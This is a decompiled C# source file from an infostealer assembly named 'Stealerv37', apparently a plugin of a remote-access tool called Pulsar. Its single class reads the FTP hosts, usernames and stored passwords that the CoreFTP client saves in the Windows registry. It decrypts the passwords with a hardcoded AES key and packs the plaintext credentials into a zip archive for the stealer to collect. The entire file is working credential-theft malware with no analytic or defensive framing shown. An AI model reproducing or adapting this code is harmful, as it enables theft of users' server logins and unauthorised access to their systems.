// Decompiled with JetBrains decompiler
// Type: Intelix.Targets.Applications.CoreFtp
// Assembly: Stealerv37, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: D491006B-B4AE-4407-B02D-3CC101716992
// Assembly location: C:\Users\Administrator\Downloads\Pulsar Premium v2.4.5\Plugins\Stealer.Client.dll

using Intelix.Helper.Data;
using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;

#nullable disable
namespace Intelix.Targets.Applications;

public class CoreFtp : ITarget
{
  public void Collect(InMemoryZip zip, Counter counter)
  {
    Counter.CounterApplications counterApplications = new Counter.CounterApplications();
    counterApplications.Name = "CoreFTP";
    using (RegistryKey registryKey1 = Registry.CurrentUser.OpenSubKey("SOFTWARE\\FTPWare\\COREFTP\\Sites"))
    {
      if (registryKey1 == null)
        return;
      List<string> values = new List<string>();
      foreach (string name in (IEnumerable<string>) ((IEnumerable<string>) registryKey1.GetSubKeyNames()).OrderBy<string, string>((Func<string, string>) (n => n)))
      {
        try
        {
          using (RegistryKey registryKey2 = registryKey1.OpenSubKey(name))
          {
            if (registryKey2 != null)
            {
              object obj1 = registryKey2.GetValue("Host");
              object obj2 = registryKey2.GetValue("User");
              object obj3 = registryKey2.GetValue("PW");
              if (obj1 != null)
              {
                if (!(obj1 is string str1))
                  str1 = obj1.ToString();
                string str2 = str1;
                if (!(obj2 is string str3))
                  str3 = obj2?.ToString() ?? "";
                string str4 = str3;
                if (!(obj3 is string hexCipher))
                  hexCipher = obj3?.ToString() ?? "";
                string str5 = CoreFtp.DecryptCoreFtpPassword(hexCipher);
                values.Add($"Url: {str2}:21\nUsername: {str4}\nPassword: {str5}\n");
                counterApplications.Files.Add(registryKey2.Name ?? "");
              }
            }
          }
        }
        catch
        {
        }
      }
      if (values.Count <= 0)
        return;
      zip.AddFile("CoreFTP\\Hosts.txt", Encoding.UTF8.GetBytes(string.Join("\n", (IEnumerable<string>) values)));
      counter.Applications.Add(counterApplications);
    }
  }

  private static string DecryptCoreFtpPassword(string hexCipher)
  {
    byte[] bytes1 = Encoding.ASCII.GetBytes("hdfzpysvpzimorhk");
    byte[] numArray = new byte[16 /*0x10*/];
    byte[] bytes2 = CoreFtp.HexToBytes(hexCipher);
    using (Aes aes = Aes.Create())
    {
      aes.KeySize = 128 /*0x80*/;
      aes.BlockSize = 128 /*0x80*/;
      aes.Key = bytes1;
      aes.IV = numArray;
      aes.Mode = CipherMode.ECB;
      aes.Padding = PaddingMode.Zeros;
      using (MemoryStream memoryStream = new MemoryStream())
      {
        using (ICryptoTransform decryptor = aes.CreateDecryptor())
        {
          using (CryptoStream cryptoStream = new CryptoStream((Stream) memoryStream, decryptor, CryptoStreamMode.Write))
          {
            cryptoStream.Write(bytes2, 0, bytes2.Length);
            cryptoStream.FlushFinalBlock();
            return Encoding.UTF8.GetString(memoryStream.ToArray());
          }
        }
      }
    }
  }

  private static byte[] HexToBytes(string hex)
  {
    int length = hex.Length / 2;
    byte[] bytes = new byte[length];
    for (int index = 0; index < length; ++index)
      bytes[index] = Convert.ToByte(hex.Substring(index * 2, 2), 16 /*0x10*/);
    return bytes;
  }
}
